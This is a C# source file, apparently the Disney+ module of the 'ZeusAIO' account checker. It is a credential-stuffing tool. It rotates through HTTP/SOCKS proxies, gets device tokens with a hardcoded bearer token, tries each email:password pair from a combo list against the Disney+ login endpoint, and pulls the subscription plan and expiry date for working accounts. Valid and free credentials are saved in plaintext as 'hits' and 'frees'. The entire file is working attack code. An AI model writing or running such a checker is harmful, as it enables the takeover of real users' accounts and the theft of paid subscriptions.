using Leaf.xNet;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using ZeusAIO;

namespace Disneyplus
{
    class Check
    {

        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            httpRequest.IgnoreProtocolErrors = true;

                        string accessToken = DisneyPlusGetToken();

                        if (accessToken == "") continue;

                        httpRequest.AddHeader("Content-Type", "application/json");
                        httpRequest.AddHeader("x-bamsdk-client-id", "disney-svod-3d9324fc");
                        httpRequest.Authorization = "Bearer " + accessToken;
                        httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback,
                        new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                        string strResponse = httpRequest.Post(new Uri("https://global.edge.bamgrid.com/idp/login"), new BytesContent(Encoding.Default.GetBytes("{\"email\":\"" + s[0] + "\",\"password\":\"" + s[1] + "\"}"))).ToString();

                        if (strResponse.Contains("id_token"))
                        {
                            JObject jsonObj = (JObject)JsonConvert.DeserializeObject(strResponse);

                            string id_token = jsonObj["id_token"].ToString();

                            string captures = "";
                            
                            while (captures == "")
                                captures = DisneyPlusGetCaptures(accessToken, id_token);

                            if (captures == "Free" || captures == "Expired")
                            {
                                ZeusAIO.mainmenu.frees++;
                                if (Config.config.LogorCui == "2")
                                {
                                    Colorful.Console.WriteLine("[FREE - DISNEYPLUS] " + s[0] + ":" + s[1], Color.OrangeRed);
                                }
                                Export.AsResult("/Disneyplus_frees", s[0] + ":" + s[1]);
                                return false;
                            }
                            else
                            {
                                ZeusAIO.mainmenu.hits++;
                                if (Config.config.LogorCui == "2")
                                {
                                    Colorful.Console.WriteLine("[HIT - DISNEYPLUS] " + s[0] + ":" + s[1] + " | " + captures, Color.Green);
                                }
                                Export.AsResult("/Disneyplus_hits", s[0] + ":" + s[1] + " | " + captures);
                                return false;
                            }

                        }
                        else if (strResponse.Contains("Bad credentials"))
                        {
                            break;
                        }
                        else
                            {
                                ZeusAIO.mainmenu.realretries++;
                                goto Retry;
                            }
                    }
                    break;
                }
                catch (Exception ex)
                {
                    ZeusAIO.mainmenu.errors++;
                }
            return false;
        }

        static string DisneyPlusGetToken()
        {
            while (true)
                try
                {
                    using (HttpRequest httpRequest = new HttpRequest())
                    {
                        string proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                        bool flag1 = ZeusAIO.mainmenu.proxyProtocol == "HTTP";
                        if (flag1)
                        {
                            httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                        }
                        bool flag2 = ZeusAIO.mainmenu.proxyProtocol == "SOCKS4";
                        if (flag2)
                        {
                            httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                        }
                        bool flag3 = ZeusAIO.mainmenu.proxyProtocol == "SOCKS5";
                        if (flag3)
                        {
                            httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                        }
                        httpRequest.IgnoreProtocolErrors = true;

                        httpRequest.AddHeader("Content-Type", "application/json");
                        httpRequest.AddHeader("x-bamsdk-client-id", "disney-svod-3d9324fc");
                        httpRequest.Authorization = "Bearer ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84";

                        string strResponse = httpRequest.Post(new Uri("https://global.edge.bamgrid.com/devices"), new BytesContent(Encoding.Default.GetBytes("{\"deviceFamily\":\"browser\",\"applicationRuntime\":\"chrome\",\"deviceProfile\":\"windows\",\"attributes\":{}}"))).ToString();

                        string assertion = "";
                        if (strResponse.Contains("assertion"))
                            assertion = Regex.Match(strResponse, "assertion\":\"(.*?)\"").Groups[1].Value;
                        if (assertion == "") return "";

                        /////////////////////////////////////////////////////////////////

                        httpRequest.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                        httpRequest.AddHeader("x-bamsdk-client-id", "disney-svod-3d9324fc");
                        httpRequest.Authorization = "Bearer ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84";

                        string strResponse2 = httpRequest.Post(new Uri("https://global.edge.bamgrid.com/token"), new BytesContent(Encoding.Default.GetBytes($"grant_type=urn:ietf:params:oauth:grant-type:token-exchange&latitude=0&longitude=0&platform=browser&subject_token={assertion}&subject_token_type=urn:bamtech:params:oauth:token-type:device"))).ToString();

                        if (strResponse2.Contains("access_token"))
                            assertion = Regex.Match(strResponse2, "\"access_token\":\"(.*?)\"").Groups[1].Value;

                        return assertion;
                    }
                }
                catch
                {
                    ZeusAIO.mainmenu.errors++;
                }
            return "";
        }
        static string DisneyPlusGetCaptures(string accessToken, string id_token)
        {
            for (int i = 0; i < 10; i++)
                try
                {
                    using (HttpRequest httpRequest = new HttpRequest())
                    {
                        string proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                        bool flag1 = ZeusAIO.mainmenu.proxyProtocol == "HTTP";
                        if (flag1)
                        {
                            httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                        }
                        bool flag2 = ZeusAIO.mainmenu.proxyProtocol == "SOCKS4";
                        if (flag2)
                        {
                            httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                        }
                        bool flag3 = ZeusAIO.mainmenu.proxyProtocol == "SOCKS5";
                        if (flag3)
                        {
                            httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                        }
                        httpRequest.IgnoreProtocolErrors = true;

                        httpRequest.AddHeader("Content-Type", "application/json");
                        httpRequest.AddHeader("x-bamsdk-client-id", "disney-svod-3d9324fc");
                        httpRequest.Authorization = "Bearer " + accessToken;

                        string strResponse = httpRequest.Post(new Uri("https://global.edge.bamgrid.com/accounts/grant"), new BytesContent(Encoding.Default.GetBytes("{\"id_token\":\"" + id_token + "\"}"))).ToString();

                        string assertion = "";
                        if (strResponse.Contains("assertion"))
                            assertion = Regex.Match(strResponse, "\"assertion\":\"(.*?)\"").Groups[1].Value;
                        if (assertion == "") return "";

                        /////////////////////////////////////////////////////////////////

                        httpRequest.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                        httpRequest.AddHeader("x-bamsdk-client-id", "disney-svod-3d9324fc");
                        httpRequest.Authorization = "Bearer ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84";

                        string strResponse2 = httpRequest.Post(new Uri("https://global.edge.bamgrid.com/token"), new BytesContent(Encoding.Default.GetBytes($"grant_type=urn:ietf:params:oauth:grant-type:token-exchange&latitude=0&longitude=0&platform=browser&subject_token={assertion}&subject_token_type=urn:bamtech:params:oauth:token-type:account"))).ToString();

                        if (strResponse2.Contains("access_token"))
                            assertion = Regex.Match(strResponse2, "\"access_token\":\"(.*?)\"").Groups[1].Value;
                        if (assertion == "") return "";

                        /////////////////////////////////////////////////////////////////

                        httpRequest.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                        httpRequest.AddHeader("x-bamsdk-client-id", "disney-svod-3d9324fc");
                        httpRequest.Authorization = "Bearer " + assertion;

                        string strResponse3 = httpRequest.Get(new Uri("https://global.edge.bamgrid.com/subscriptions")).ToString();

                        if (strResponse3.Contains("[]") && !strResponse3.Contains("name"))
                            return "Free";
                        else if (strResponse3.Contains("name"))
                        {
                            JObject jsonObj = (JObject)((JArray)JsonConvert.DeserializeObject(strResponse3))[0];
                            string plan = jsonObj["products"][0]["name"].ToString();
                            var expDate = (DateTime)jsonObj["expirationDate"];
                            if (DateTime.Now > expDate)
                            {
                                return "Expired";
                            }

                            return "Plan: " + plan + " - Expiration Date: " + expDate.ToString("dd/MM/yyyy");
                        }
                    }
                }
                catch
                {
                    ZeusAIO.mainmenu.errors++;
                }
            return "";
        }
    }
}
